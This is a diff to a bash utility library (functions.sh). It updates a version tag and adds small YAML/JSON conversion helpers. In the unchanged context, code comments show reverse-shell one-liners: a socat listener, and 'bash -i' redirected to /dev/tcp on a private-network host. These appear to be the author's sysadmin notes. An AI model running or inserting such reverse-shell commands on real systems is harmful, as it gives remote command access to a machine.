@@ -21,7 +21,7 @@ set -o nounset   ## set -u : exit the script if you try to use an uninitialised 
 fi
 set -o errexit   ## set -e : exit the script if any statement returns a non-true return value
 
-VERSION+=("15fe138[2024-09-05T15:38:57+08:00]:functions.sh")
+VERSION+=("1f8c67d[2024-09-24T12:34:00+08:00]:functions.sh")
 
 # need bash version >= 4.2 for associative arrays and other features.
 if (( BASH_VERSINFO[0]*100 + BASH_VERSINFO[1] < 402 )); then
@@ -47,6 +47,19 @@ func_wrapper() {
     shift
     local args=$@
     ${func} ${args} || { [ $? = 127 ] && warn_msg "${func} not implemented\n"; }
+}
+
+#  echo '{"key": "val"}' | json2yaml | yaml2json
+yaml2json() {
+  python3 -c 'import sys, yaml, json; print(json.dumps(yaml.safe_load(sys.stdin.read())))'
+}
+
+yaml2json_pretty()  {
+  python3 -c 'import sys, yaml, json; print(json.dumps(yaml.safe_load(sys.stdin.read()), indent=2, sort_keys=False))'
+}
+
+json2yaml()  {
+  python3 -c 'import sys, yaml, json; print(yaml.dump(json.loads(sys.stdin.read())))'
 }
 
 virsh_wrap() {
@@ -230,7 +243,6 @@ disply_func() {
 # local<192.168.168.A>  run: socat file:`tty`,raw,echo=0 tcp-listen:9999
 # remote<192.168.168.B> run: bash -i &> /dev/tcp/192.168.168.A/9999 0>&1
 # remote<192.168.168.B> run: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.168.A:9999
-
 
 eval2bg() {
     #Keep Background Processes Running After a Shell Exits(nohup/disown)
